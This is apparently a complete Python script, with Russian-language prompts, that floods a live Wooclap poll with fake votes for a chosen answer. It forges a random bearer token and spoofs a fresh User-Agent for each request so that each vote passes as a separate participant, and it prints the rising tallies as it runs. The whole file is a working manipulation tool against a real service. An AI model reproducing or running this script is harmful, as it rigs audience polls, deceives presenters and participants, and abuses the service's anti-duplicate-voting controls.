import asyncio
import datetime
import math
import os
import random
from dataclasses import dataclass
import sys
import time
import aiohttp
from user_agent import generate_user_agent
from typing import List


@dataclass
class Wooclap:
    api_link: str = ''
    spam_link: str = 'https://app.wooclap.com/api/questions/'
    question_id: str = ''
    author_id: str = ''
    number_of_attacks = 50

    def exception_handler(request, exception):
        print("Request failed", request, exception)

    def generate_token(self) -> str:
        presentDate = datetime.datetime.now()
        unix_timestamp = datetime.datetime.timestamp(presentDate)*1000
        return f"z{math.floor(random.random() * random.random() * unix_timestamp)}"

    async def get_info(self) -> List[dict]:
        async with aiohttp.ClientSession() as session:
            req = await session.get(self.api_link, json={'isParticipant': 'true', 'from': 'app'},
                                    headers={
                'Content-Type': 'application/json',
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'User-Agent': generate_user_agent(),
                'authorization': f"bearer {self.generate_token()}"
            }
            )
            data = await req.json()
            self.author_id = data.get('selectedQuestion')
            if not self.author_id:
                sys.exc_info('author_id = None')
            return data.get('questions')[-1]#.get('choices')

    async def smoothly(self) -> None:
        async with aiohttp.ClientSession() as session:
            for _ in range(self.number_of_attacks):
                token: str = self.generate_token()
                async with session.post(self.spam_link + self.author_id + '/push_answer', headers={
                    'User-Agent': generate_user_agent(),
                    'authorization': f"bearer {token}"
                },
                    json={"choices": [self.question_id], "token": token}
                ) as resp:
                    if resp.status != 200:
                        time.sleep(1)
                    data = await resp.json()
                    if data.get('error'):
                        print(data.get('error').get('message'))
                        await asyncio.sleep(2)
                        continue
                    info = await self.get_info()
                    answers = info.get('choices')
                    result = info.get('nbAnswersByChoice')
                    if _ % 3 == 0:
                        os.system('cls')
                        print('_'*20)
                        for answer in answers:
                            print(answer.get('choice'), result.get(answer.get('_id')))
                        

    async def start(self):
        self.api_link = 'https://app.wooclap.com/api/events/' + input('Введите ссылку: ').split('/')[-1]  #
        # self.api_link = 'https://app.wooclap.com/api/events/BBGUOK'
        info = await self.get_info()
        answers = info.get('choices')
        for num, answer in enumerate(answers):
            print(f'{num+1})', answer.get('choice'))
        question_number = int(input('Введите номер ответа '))
        self.question_id: str = answers[question_number-1].get('_id')
        n_of_a = input('Введите кол-во голосов(50): ')
        if n_of_a != '':
            self.number_of_attacks: int = int(n_of_a)
        type_attack: int = 1
        if type_attack == 1:
            await self.smoothly()


if __name__ == '__main__':
    W = Wooclap()
    asyncio.get_event_loop().run_until_complete(W.start())
